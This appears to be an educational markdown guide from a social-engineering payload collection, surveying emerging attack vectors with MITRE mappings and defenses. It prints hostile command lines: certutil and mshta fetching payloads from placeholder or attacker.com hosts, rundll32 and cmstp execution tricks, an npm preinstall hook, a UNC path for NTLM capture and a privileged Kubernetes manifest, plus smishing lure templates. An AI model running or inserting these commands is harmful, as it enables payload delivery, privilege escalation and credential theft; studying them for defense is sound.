# Emerging Threats in Social Engineering

> **⚠️ DISCLAIMER**: This document is for **educational and research purposes ONLY**.
> Understanding emerging threat vectors helps organizations prepare proactive defenses.

---

## Overview

This document covers emerging attack vectors not covered by the existing payload collection.
These represent the cutting edge of social engineering techniques used in current threat campaigns.

---

## 1. Living-off-the-Land (LOLBins)

### Why LOLBins Are Powerful

Living-off-the-Land attacks use legitimate, pre-installed Windows binaries to execute
malicious actions. They are effective because:

- **No malware to detect**: Using built-in tools bypasses AV
- **Trusted signers**: Binaries are signed by Microsoft
- **Whitelisting bypass**: Application whitelisting often allows these binaries
- **Forensic challenges**: Hard to distinguish malicious from legitimate use

### Key LOLBins for Social Engineering

#### certutil.exe
```cmd
# Download and execute (educational reference)
certutil -urlcache -split -f http://[url]/payload.exe %TEMP%\payload.exe
certutil -decode encoded_payload.b64 decoded_payload.exe
```
**MITRE**: T1105, T1027.010  
**Detection**: certutil.exe making network connections; unusual certutil arguments

#### rundll32.exe
```cmd
# Execute DLL (educational reference)
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";
rundll32.exe advpack.dll,LaunchINFSection malicious.inf,DefaultInstall
```
**MITRE**: T1218.011  
**Detection**: rundll32.exe with JavaScript arguments; unexpected DLL targets

#### mshta.exe
```cmd
# Execute HTA file (educational reference)
mshta.exe http://attacker.com/payload.hta
mshta.exe "javascript:a=new ActiveXObject('WScript.Shell');a.run('calc.exe');close();"
```
**MITRE**: T1218.005  
**Detection**: mshta.exe spawned from Office applications; network connections from mshta

#### cmstp.exe
```cmd
# UAC bypass (educational reference)
cmstp.exe /ni /s malicious.inf
```
**MITRE**: T1218.003  
**Detection**: cmstp.exe execution monitoring; UAC bypass patterns

#### regsvcs.exe / regasm.exe
```cmd
# Execute .NET assembly (educational reference)
regsvcs.exe payload.dll
regasm.exe payload.dll
```
**MITRE**: T1218.009  
**Detection**: regsvcs/regasm loading unusual DLLs; network connections from these processes

### LOLBin Execution Chain

A common LOLBin chain seen in phishing campaigns:
```
Email → Word Macro → cmd.exe → certutil (download) → mshta.exe (execute)
```

### Defense
- Behavioral monitoring is more effective than signature-based detection
- Hunt for parent-child process relationships involving LOLBins
- Configure AppLocker/WDAC policies for LOLBin execution logging
- Block unnecessary LOLBins if not required for business operations

---

## 2. Cloud & SaaS Attack Vectors

### Why Cloud Attacks Are Growing

- Massive shift to cloud services (Office 365, G-Suite, Slack, Teams)
- Many organizations have inconsistent security policies for cloud vs on-premise
- Trust relationships between cloud services and users
- Cloud services often bypass traditional perimeter defenses

### Microsoft Teams Attacks

**Threat Scenario**: As organizations migrate to Teams for communication, attackers are
targeting it as a new phishing vector.

**Attack Vectors**:
1. **External sender phishing**: Teams allows external senders by default in many tenants
2. **Tab injection**: Malicious tabs embedded in team channels
3. **Bot impersonation**: Bots impersonating IT help desk
4. **File share phishing**: Malicious files shared via Teams file sharing

**Real-World Impact**: GIF-based attack chain (Cyber Research Lab finding, 2020) showed
cookie theft via Teams GIF processing.

**Detection**:
- Monitor Teams audit logs for unusual external user activities
- Alert on new external users being added to teams
- Monitor for unusual file sharing patterns in Teams

---

### Microsoft SharePoint / OneDrive

**Attack Vectors**:
1. Shared links to malicious documents stored on legitimate SharePoint/OneDrive
2. URL passes email security (trusted Microsoft domain)
3. Documents may require re-authentication (credential capture opportunity)
4. Fake "document requires update" prompts

**Why It Bypasses Defenses**:
```
Email contains: https://companyname.sharepoint.com/sites/...
→ Email security tools trust *.sharepoint.com
→ Link is "safe"
→ Target follows link
→ Malicious content served from trusted domain
```

**Defense**: Configure Defender for Office 365 to scan SharePoint/OneDrive content.

---

### Google Drive Phishing

Similar to SharePoint attacks, using Google's infrastructure:
```
Phishing email → Google Drive link → Fake login page / malicious file
```

**Detection**: Monitor for Google Drive shares from external users. Train users to
verify requests through out-of-band channels.

---

### AWS S3 Credential Exposure

**Attack Scenarios**:
1. Public S3 bucket with exposed credentials or sensitive files
2. Phishing pages hosted on S3 (bypasses domain-based blocking)
3. Pre-signed URL abuse for temporary access

**Detection**:
- AWS CloudTrail monitoring for unusual API calls
- S3 bucket policy auditing
- Alert on new public S3 bucket creation

---

## 3. Mobile-First Phishing

### Why Mobile Is a Growing Target

- Mobile devices often have weaker security controls than enterprise desktops
- BYOD (Bring Your Own Device) policies reduce organizational control
- Smaller screens make URL inspection difficult
- Push notifications create urgency
- SMS lacks the security controls of email

### Mobile-Optimized Phishing Pages

**Design Differences from Desktop**:
- Single-column layout optimized for small screens
- Touch-friendly buttons and form elements
- Progressive Web App (PWA) techniques for more convincing experience
- Fake "App Store" prompts for credential entry

**Detection Challenge**: URL bars are often hidden in mobile browsers; HTTPS adds false legitimacy.

---

### SMS-Based Attacks (Smishing)

**Common Patterns**:
```
"ALERT: Your [Bank] account has been locked. Verify now: http://[short-url]"
"[Delivery Service]: Package held, confirm address: [link]"
"[Company IT]: Your VPN certificate expired. Renew: [link]"
```

**Why It's Effective**:
- Higher open rates than email
- Recipients trust SMS more than email
- Phone numbers are harder to spoof than email addresses (though still possible)
- URL shorteners hide destination

---

### QR Code Attacks (Quishing)

**Concept**: Malicious QR codes that redirect to phishing pages or execute commands.

**Attack Scenarios**:
1. QR code in phishing email bypasses link scanners (scanners can't decode QR)
2. Malicious QR codes posted over legitimate ones in physical spaces
3. QR codes on fake packages, tickets, or physical mail

**In Emails**:
```
"For security purposes, please scan this QR code to verify your identity"
→ QR redirects to phishing page
→ Email security tools scan for URLs, not embedded QR codes
```

**Detection**:
- Train users to inspect QR code destinations before acting
- Mobile MDM policies to control camera scanning
- Email security tools now emerging that detect QR codes in images

---

### Fake Mobile App Updates

**Concept**: "Your banking app requires a security update — click here to install"

**Technical Implementation**:
- Phishing page with fake "App Store" UI
- Android: APK served directly (side-loading)
- iOS: Enterprise certificates or TestFlight abuse

---

## 4. Browser Extension Attacks

### Browser as an Attack Surface

Modern browsers store enormous amounts of sensitive data:
- Saved passwords
- Session cookies
- Form autofill data
- Browsing history
- Certificates and keys

Malicious extensions have broad access to this data.

### Extension Installation Vectors

1. **Direct phishing**: "Install this security extension to access this content"
2. **Legitimate extension compromise**: Take over a popular extension via account compromise
3. **Chrome Web Store listing**: Publish extension appearing to be legitimate tool
4. **Enterprise policy push**: If attacker has admin access

### What Malicious Extensions Can Do

| Capability | Impact |
|------------|--------|
| Read all pages | Capture all typed credentials |
| Modify pages | Inject phishing content, swap payment pages |
| Access cookies | Session hijacking without password |
| Monitor navigation | Track user activity and targeted behavior |
| Make network requests | Exfiltrate data |

**MITRE**: T1176 (Browser Extensions)

### Defense
- Use browser management policies to whitelist approved extensions
- Monitor new extension installations via EDR/MDM
- Periodically audit installed extensions
- User training to not install browser extensions from untrusted sources

---

## 5. Container & Kubernetes Attacks

### Growing Relevance

As organizations adopt containerization, attackers targeting cloud-native infrastructure
increasingly use social engineering to gain initial access or escalate privileges.

### Container Escape

**Concept**: Code executing inside a container escapes to the host system.

**Common Scenarios**:
- Misconfigured container with privileged mode
- Volume mounts exposing sensitive host paths
- Docker socket mounted inside container

**Social Engineering Angle**:
```
Phishing → Developer installs malicious package
→ Package executes in CI/CD pipeline container
→ Container escape to CI/CD host system
→ Access to build secrets, deploy keys
```

---

### Kubernetes Manifest Injection

**Attack Vector**: Developer is social engineered into applying a malicious Kubernetes manifest.

**Malicious Manifest Elements**:
```yaml
# Privileged container (educational example)
securityContext:
  privileged: true  # Host-level access

# Host path mount (data exfiltration)
volumes:
- name: host-data
  hostPath:
    path: /etc/
```

**Detection**:
- Policy-as-Code (OPA/Gatekeeper) blocks privileged containers
- Kubernetes audit logging
- Alert on new namespace creation, privileged pod deployment

---

## 6. Supply Chain Attacks

### Why Supply Chain Is Critical

Supply chain attacks can compromise thousands of targets through a single compromise.

### NPM/PyPI Package Attacks

**Attack Types**:
1. **Typosquatting**: Publish `node-uuid` when real package is `uuid`
2. **Dependency confusion**: Internal package name published publicly
3. **Compromised maintainer**: Account takeover of popular package

**Payload Delivery Method**:
```javascript
// preinstall script in package.json (educational)
"scripts": {
  "preinstall": "node -e \"require('child_process').exec('calc.exe')\""
}
```

**Detection**:
- Use lock files (package-lock.json, requirements.txt with hashes)
- Software composition analysis (SCA) in CI/CD
- Private package registries
- Monitor npm audit for known malicious packages

---

### Compromised Installer

**Concept**: Legitimate software installer modified to include additional payload.

**Historical Examples**:
- CCleaner compromise (2017): 2.27M users affected
- SolarWinds Orion (2020): 18,000+ customers
- 3CX supply chain (2023)

**Detection**:
- Verify installer integrity (checksums, signatures)
- Monitor software update mechanisms
- Use software provenance tracking

---

## 7. Authentication Bypass Techniques

### NTLM Relay Attacks

**Concept**: Capture NTLM authentication and relay it to another service.

```
Target authenticates to: Attacker's fake server
Attacker relays auth to: Real internal server (file share, exchange, etc.)
Result: Authenticated access to target service
```

**Social Engineering Setup**: Phishing email forces target's machine to authenticate:
```
- Email with embedded image from UNC path (\\attacker.com\share\img.png)
- Word document with embedded resource from UNC path
```

**MITRE**: T1557.001 (Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning)

**Defense**: 
- Sign SMB traffic (SMB signing)
- Block NTLM authentication where possible
- Require Kerberos authentication

---

### OAuth Flow Hijacking

**Concept**: Abuse OAuth authorization code flow to steal access tokens.

**Attack Flow**:
```
1. Attacker registers malicious OAuth app with Microsoft/Google
2. Phishing email links to "legitimate-looking" OAuth consent page
3. Target grants app permissions
4. Attacker gains persistent API access token
5. Access remains even after password change (until token revoked)
```

**Why It Bypasses MFA**: User authenticates legitimately (MFA passes), then consents to
malicious application.

**MITRE**: T1550.001 (Application Access Token)

**Defense**:
- Azure AD/Google Workspace: Block non-admin OAuth app consent
- User training: Don't consent to unknown apps
- Regular OAuth app permission audits
- Alert on new OAuth app consent events

---

### SSO Token Interception

**Techniques**:
1. Pass-the-Cookie: Steal session cookie to bypass auth
2. Token theft from browser storage
3. SAML response replay

**Defense**:
- Short token lifetimes
- Token binding where supported
- Conditional access (device compliance, IP restrictions)
- FIDO2/WebAuthn for strongest protection

---

## Threat Intelligence Summary

| Category | Trend | Detection Difficulty |
|----------|-------|---------------------|
| LOLBins | Increasing | Hard (legitimate binaries) |
| Cloud/SaaS | Rapidly growing | Medium |
| Mobile/QR | Emerging | Hard (QR bypasses email scan) |
| Browser Extensions | Stable | Medium |
| Supply Chain | High impact, selective | Very Hard |
| Auth Bypass | Increasing (MFA push) | Hard |

---

## Recommended Defensive Investments

Based on threat trajectory, organizations should prioritize:

1. **Phishing-resistant MFA** (FIDO2/hardware keys) — combats AiTM and MFA bypass
2. **Cloud security posture** — SaaS security monitoring, OAuth app governance
3. **Endpoint behavioral detection** — EDR with LOLBin behavioral rules
4. **Supply chain security** — SCA tools, package signing, dependency pinning
5. **User awareness** — QR code awareness, OAuth consent training
6. **Zero Trust architecture** — Limit lateral movement impact

---

*See [EVOLVED_TECHNIQUES.md](EVOLVED_TECHNIQUES.md) for evolved versions of existing techniques*  
*See [PAYLOAD_CHAINING.md](PAYLOAD_CHAINING.md) for multi-stage attack chain documentation*
